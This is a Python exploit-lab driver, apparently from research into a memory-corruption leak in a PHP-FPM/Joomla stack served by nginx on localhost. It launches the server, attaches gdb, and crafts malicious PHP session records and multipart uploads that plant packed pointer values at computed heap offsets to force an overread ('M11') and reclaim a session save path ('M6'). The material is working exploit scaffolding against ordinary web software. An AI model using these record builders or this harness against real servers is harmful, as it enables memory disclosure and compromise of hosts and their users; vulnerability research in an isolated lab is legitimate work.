#!/usr/bin/env python3
"""Static leak lab driver: M6 save_path reclaim + M11 overread, static HTTP fetch."""
import hashlib, http.client, json, os, re, signal, socket, struct, subprocess, sys, time

R = "/tmp/opencode/research/joomla_fpm_20261022T021000Z"
PORT = 28871
SESS = "/tmp/opencode/joomla5/tmp"
UP = SESS
DOC = "/tmp/opencode/joomla5"
HTTPD = "/opt/nginx-1.30.1/sbin/nginx"
CONF = R + "/conf/nginx.conf"
GLOG = R + "/gdb/gdb.log"
ARMS = R + "/arms"
BODIES = R + "/bodies"

PLANT_REC = b"x|" + b"a:1:{i:0;" * 7216
SMALL = b"S" * 32


def logmsg(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def wait_port(timeout=15.0):
    t0 = time.time()
    while time.time() - t0 < timeout:
        s = socket.socket()
        s.settimeout(0.3)
        try:
            s.connect(("127.0.0.1", PORT))
            s.close()
            return True
        except Exception:
            s.close()
            time.sleep(0.1)
    return False


def start():
    os.makedirs(ARMS, exist_ok=True)
    gout = open(R + "/logs/httpd.out", "ab")
    p = subprocess.Popen([HTTPD, "-X", "-f", CONF], stdout=gout, stderr=subprocess.STDOUT,
                         cwd=R, start_new_session=True)
    if not wait_port(20):
        raise SystemExit("port did not open")
    logmsg("instance up pid=%d" % p.pid)
    return p


def stop(p):
    try:
        pid = int(open(R + "/httpd.pid").read().strip())
        os.kill(pid, signal.SIGTERM)
    except Exception as e:
        logmsg("stop: %s" % e)
    try:
        p.wait(timeout=10)
    except Exception:
        p.kill()
    for _ in range(50):
        if not wait_port(0.1):
            break
    logmsg("instance down")


def field(name, value):
    return {"kind": "field", "name": name, "value": value}


def filepart(name="f", filename="f.bin", content=b"X"):
    return {"kind": "file", "name": name, "filename": filename, "content": content}


def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        if p["kind"] == "field":
            out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"\r\n\r\n'
            out += p["value"] + b"\r\n"
        else:
            out += (b'Content-Disposition: form-data; name="' + p["name"].encode()
                    + b'"; filename="' + p["filename"].encode() + b'"\r\n'
                    + b"Content-Type: application/octet-stream\r\n\r\n")
            out += p["content"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def post(target, parts, boundary=b"slboundary", timeout=120, tag=None, cookie=None):
    if not isinstance(boundary, bytes):
        boundary = boundary.encode()
    body = build_multipart(parts, boundary)
    if tag:
        open(os.path.join(BODIES, tag + ".bin"), "wb").write(body)
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
    h = {"Host": "127.0.0.1:%d" % PORT,
         "Content-Type": "multipart/form-data; boundary=" + boundary.decode(),
         "Connection": "close"}
    if cookie:
        h["Cookie"] = "PHPSESSID=" + cookie
    t0 = time.time()
    try:
        c.request("POST", target, body=body, headers=h)
        r = c.getresponse()
        b = r.read()
        out = {"status": r.status, "body": b, "headers": r.getheaders(),
               "ms": int((time.time() - t0) * 1000), "sent": len(body)}
    except Exception as e:
        out = {"status": None, "body": b"", "headers": [], "err": repr(e),
               "ms": int((time.time() - t0) * 1000), "sent": len(body)}
    finally:
        c.close()
    ar = {"target": target, "status": out["status"], "sent": out["sent"],
          "ms": out["ms"], "err": out.get("err"),
          "body_head": out["body"][:800].decode("latin1")}
    if tag:
        json.dump(ar, open(os.path.join(ARMS, tag + ".json"), "w"), indent=1)
        open(os.path.join(ARMS, tag + ".resp.bin"), "wb").write(out["body"])
    logmsg("POST %s status=%s sent=%d ms=%d err=%s" % (target, out["status"], out["sent"], out["ms"], out.get("err")))
    return out


def get(target, timeout=30):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
    h = {"Host": "127.0.0.1:%d" % PORT, "Connection": "close"}
    t0 = time.time()
    try:
        c.request("GET", target, headers=h)
        r = c.getresponse()
        b = r.read()
        out = {"status": r.status, "body": b, "headers": r.getheaders(),
               "ms": int((time.time() - t0) * 1000)}
    except Exception as e:
        out = {"status": None, "body": b"", "headers": [], "err": repr(e),
               "ms": int((time.time() - t0) * 1000)}
    finally:
        c.close()
    logmsg("GET %s status=%s len=%d" % (target, out["status"], len(out["body"])))
    return out


# ---- M11 record builders (identical shape to bootstrap run3.py) ----
def build_sjk(X, P, B0, used, small=SMALL, n=4096, plant=True):
    base = X + 24
    head = b"S|s:%d:\"" % len(small) + small + b'";'
    head += b"J|i:%d;" % n
    L = 0x13010
    for _ in range(8):
        start = len(head) + len(b"K|s:") + len(str(L)) + 2
        want = 0x13010 - start
        if want == L:
            break
        L = want
    start = len(head) + len(b"K|s:") + len(str(L)) + 2
    assert start + L == 0x13010, (start, L)
    blob = bytearray(b"A" * L)
    if plant:
        for off, val in ((0, P + 56), (8, 0), (16, B0), (24, 0), (32, 0),
                         (40, 0), (48, 0x7FFFFFFF), (56, 0), (64, 0)):
            i = (P + off - base) - start
            assert 0 <= i and i + 8 <= L, (off, i)
            blob[i:i + 8] = struct.pack("<Q", val)
        i = (B0 - base) - start
        assert 0 <= i and i + 8 <= L, (i,)
        blob[i:i + 8] = struct.pack("<q", used)
    pre = head + b"K|s:%d:\"" % L
    rec = pre + bytes(blob) + b'";'
    return rec, dict(start=start, L=L, total=len(rec), used=used, X=X, P=P, B0=B0)


def seed(path, data):
    open(path, "wb").write(data)
    return {"path": path, "len": len(data), "sha1": hashlib.sha1(data).hexdigest()}


# ---- gdb harness ----
def gdb_attach(pid, script, tag):
    gout = open(R + "/logs/gdb_%s.out" % tag, "wb")
    p = subprocess.Popen(["gdb", "-q", "--batch", "-x", script, "-p", str(pid)],
                         stdout=gout, stderr=subprocess.STDOUT, cwd=R, start_new_session=True)
    for _ in range(200):
        if os.path.exists(GLOG) and "armed" in open(GLOG, "r", errors="replace").read():
            return p, True
        time.sleep(0.1)
    return p, False


def logtxt():
    return open(GLOG, "r", errors="replace").read()


def req_count():
    return len(re.findall(r"PHPRQ_START", logtxt()))


def lines_for(n):
    return [l for l in logtxt().splitlines() if re.search(r"REQ%d " % n, l)]


def geti(rx, s, base=16, default=None):
    m = re.search(rx, s)
    return int(m.group(1), base) if m else default
